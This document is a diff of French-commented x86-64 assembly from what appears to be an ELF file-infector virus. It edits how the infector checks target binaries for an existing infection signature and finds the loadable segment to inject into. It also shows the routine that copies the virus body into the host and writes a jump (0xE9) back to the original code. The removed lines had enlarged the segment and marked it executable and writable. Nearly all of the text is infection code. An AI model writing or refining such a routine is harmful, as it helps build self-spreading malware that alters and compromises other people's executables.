@@ -41,22 +41,13 @@ get_file_data:
     mov [r12 + fileData], rax   ; faire des check pour le format
 
 check_signature:                ; boucle sur tout les bytes du fichier pour voir si il n'y a pas deja une signature
-    xor rdx, rdx
-    lea rax, [rel signature]
-    mov rbx, [r12 + fileSize]
-    sub rbx, SIGNATURE_SIZE - 1
-    jmp check_signature_cmp
-    check_signature_loop:
-        mov rdi, rax
-        mov rsi, [r12 + fileData]
-        add rsi, rdx
-        mov rcx, SIGNATURE_SIZE  
-        repz cmpsb
-        jz close_mmap           ; on quite proprement si il y a deja une signature
-        inc rdx  
-    check_signature_cmp:
-    cmp rdx, rbx
-    jl check_signature_loop
+    lea rdi, [rel signature]
+    mov rsi, [r12 + fileData]
+    add rsi, [r12 + fileSize]
+    sub rsi, SIGNATURE_SIZE
+    mov rcx, SIGNATURE_SIZE  
+    repz cmpsb
+    jz close_mmap           ; on quite proprement si il y a deja une signature
     
 check_file_integrity:
     mov rdi, [r12 + fileData]
@@ -135,8 +126,17 @@ phead_loop:
     cmp qword [r12 + pload], 0
     jz close_mmap                    ;on quite si il n'y a pas de pload trouvé
 
-check_pload_size:
+check_pload_signature:
     mov r13, [r12 + pload]
+    lea rdi, [rel signature]
+    mov rsi, [r12 + fileData]
+    add rsi, [r13 + p_filesz]
+    sub rsi, SIGNATURE_SIZE
+    mov rcx, SIGNATURE_SIZE  
+    repz cmpsb
+    jz close_mmap           ; on quite proprement si il y a deja une signature
+check_pload_size:
+;    mov r13, [r12 + pload]
     mov rax, [r13 + p_filesz]
     add rax, PROG_SIZE
     mov rdi, [r12 + fileSize]
@@ -224,13 +224,6 @@ copy_program:
     ; ecrit le jump a l'adress de jump
     mov [rbx + JMP_OFFSET], byte 0xE9 ; 0xe9 = jmp
     mov [rbx + JMP_OFFSET + 1], ecx
-
-    ; augmente la taille du premier pload
-    add qword [r13 + p_memsz], PROG_SIZE
-    add qword [r13 + p_filesz], PROG_SIZE
-    
-    or dword [r13 + p_flags], PF_X           ; ajoute les droit d'execution
-    or dword [r13 + p_flags], PF_W           ; ajoute les droit d'execution
 
     mov r13, rbx
 
